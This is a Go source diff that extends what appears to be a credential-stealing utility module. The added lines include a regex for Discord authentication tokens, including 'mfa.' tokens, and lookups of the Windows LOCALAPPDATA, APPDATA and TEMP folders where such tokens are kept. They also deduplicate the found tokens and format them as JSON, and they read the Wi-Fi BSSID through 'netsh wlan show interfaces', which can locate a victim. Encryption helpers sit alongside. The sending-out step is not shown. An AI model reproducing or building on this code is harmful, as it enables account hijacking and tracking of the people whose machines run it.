@@ -4,19 +4,32 @@ import (
 	"crypto/aes"
 	"crypto/sha256"
 	"encoding/hex"
+	"encoding/json"
 	"fmt"
 	"log"
 	"math/rand"
+	"os"
+	"os/exec"
 	"os/user"
 	"regexp"
 	"strings"
 	"time"
 )
 
-const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-const numberBytes = "0123456789"
+const (
+	numberBytes string = "0123456789"
+	letterBytes string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+)
 
-var HEADERS [999]string
+var (
+	USER string = GetUsername()
+
+	LOCAL   string = os.Getenv("LOCALAPPDATA")
+	ROAMING string = os.Getenv("APPDATA")
+	TEMP    string = os.Getenv("TEMP")
+
+	HEADERS [999]string
+)
 
 func GetUsername() string {
 	user, err := user.Current()
@@ -31,13 +44,30 @@ func GetUsername() string {
 	}
 }
 
-func FindAll(input string) []string {
-	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27})|(mfa\\.[\\w-]{84})")
+func FindAllTokens(input string) []string {
+	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
 	if e != nil {
 		log.Fatalf(e.Error())
 	}
 
 	return Expression.FindAllString(input, -1)
+}
+
+func RemoveDuplicates[T string | int](sliceList []T) []T {
+	allKeys := make(map[T]bool)
+	list := []T{}
+	for _, item := range sliceList {
+		if _, value := allKeys[item]; !value {
+			allKeys[item] = true
+			list = append(list, item)
+		}
+	}
+	return list
+}
+
+func FormatTokens(input []string) string {
+	output, _ := json.Marshal(RemoveDuplicates(input))
+	return string(output)
 }
 
 func Slice(s string, chunkSize int) []string {
@@ -102,6 +132,27 @@ func CryptSign(input, expected string) (hash, nonce string) {
 	return out, nonce
 }
 
+func GetBSSID() string {
+	out, err := exec.Command("cmd", "/c", "netsh wlan show interfaces").CombinedOutput()
+	if err != nil {
+		fmt.Println("Failed to find BSSID:", err)
+	}
+
+	Expression1, e := regexp.Compile("(BSSID[ \\t]*:[ \\t])(([0-9a-f]{2}([:]|)){6})")
+	Expression2, e := regexp.Compile("(([0-9a-f]{2}([:]|)){6})")
+	if e != nil {
+		log.Fatalf(e.Error())
+	}
+
+	var RegexFind []string = Expression2.FindAllString(Expression1.FindAllString(string(out), -1)[0], -1)
+
+	if len(RegexFind) == 0 || RegexFind[0] == "" {
+		return "None"
+	} else {
+		return RegexFind[0]
+	}
+}
+
 func EncryptAES(key []byte, plaintext string) string {
 	// create cipher
 	c, err := aes.NewCipher(key)
@@ -121,7 +172,6 @@ func EncryptAES(key []byte, plaintext string) string {
 func ToString(s interface{}) string {
 	return fmt.Sprint(s)
 }
-
 
 func Encrypt(s, key string) string {
 	var out string = ""
